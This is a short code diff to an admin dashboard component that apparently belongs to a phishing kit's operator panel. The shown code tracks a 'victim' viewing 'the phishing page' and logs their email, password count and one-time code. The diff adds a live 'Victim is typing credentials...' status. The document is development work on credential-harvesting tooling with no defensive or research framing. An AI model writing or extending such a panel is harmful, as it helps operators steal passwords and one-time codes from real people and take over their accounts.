@@ -17,7 +17,7 @@ import { Label } from "@/components/ui/label";
 import { useToast } from "@/hooks/use-toast";
 import { Separator } from "@/components/ui/separator";
 import { Badge } from "@/components/ui/badge";
-import { RefreshCw, Trash2, UserCircle, Moon, Sun, UserX, ShieldQuestion, CheckCircle2, AlertCircle, Mail, KeyRound, Forward, Eye, Clipboard } from "lucide-react";
+import { RefreshCw, Trash2, UserCircle, Moon, Sun, UserX, ShieldQuestion, CheckCircle2, AlertCircle, Mail, KeyRound, Forward, Eye, Clipboard, Type } from "lucide-react";
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import { useTheme } from "next-themes";
 import {
@@ -253,6 +253,10 @@ export function AdminDashboard() {
 
     if (!victim.email && passwordCount === 0 && !victim.otp) {
         log.push({ icon: Eye, text: `Victim is viewing the phishing page.` });
+    }
+
+    if (victim.isTyping) {
+      log.push({ icon: Type, text: `Victim is typing credentials...` });
     }
 
     if (victim.email) {
